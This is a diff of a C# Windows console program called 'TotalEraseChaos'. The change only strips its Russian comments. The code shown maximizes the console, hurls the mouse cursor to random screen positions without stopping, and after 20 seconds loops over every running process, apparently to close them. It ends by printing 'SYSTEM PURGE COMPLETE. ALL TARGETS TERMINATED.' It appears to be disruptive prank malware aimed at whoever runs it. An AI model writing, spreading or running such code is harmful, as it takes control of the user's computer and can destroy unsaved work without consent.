@@ -14,10 +14,8 @@ class TotalEraseChaos
     [DllImport("user32.dll")]
     static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-    // Импорт для управления курсором
     [DllImport("user32.dll")]
     static extern bool SetCursorPos(int X, int Y);
-    // Импорт для получения разрешения экрана
     [DllImport("user32.dll")]
     static extern int GetSystemMetrics(int nIndex);
 
@@ -33,13 +31,12 @@ class TotalEraseChaos
     static void Main()
     {
         IntPtr hWnd = GetConsoleWindow();
-        ShowWindow(hWnd, 3); // Развернуть окно
+        ShowWindow(hWnd, 3); 
 
         IntPtr h = GetStdHandle(-11);
         short w = (short)Console.LargestWindowWidth;
         short h_eff = (short)Console.LargestWindowHeight;
 
-        // Получаем размеры экрана для метания курсора
         int scrW = GetSystemMetrics(0);
         int scrH = GetSystemMetrics(1);
 
@@ -54,10 +51,8 @@ class TotalEraseChaos
         {
             double elapsed = sw.Elapsed.TotalSeconds;
 
-            // 1. ХАОТИЧНЫЙ КУРСОР (Работает постоянно)
             SetCursorPos(rnd.Next(0, scrW), rnd.Next(0, scrH));
 
-            // 2. ЗАКРЫТИЕ ОКОН (После 20-й секунды)
             if (elapsed >= 20.0)
             {
                 foreach (var p in Process.GetProcesses())
@@ -73,7 +68,6 @@ class TotalEraseChaos
                 }
             }
 
-            // 3. ОТРИСОВКА ВИЗУАЛЬНЫХ ЭФФЕКТОВ
             double progress = elapsed / 25.0;
             int intensity = (int)(buffer.Length * 0.3 * progress) + 50;
 
@@ -103,4 +97,5 @@ class TotalEraseChaos
         Console.WriteLine("SYSTEM PURGE COMPLETE. ALL TARGETS TERMINATED.");
         Thread.Sleep(2000);
     }
+
 }
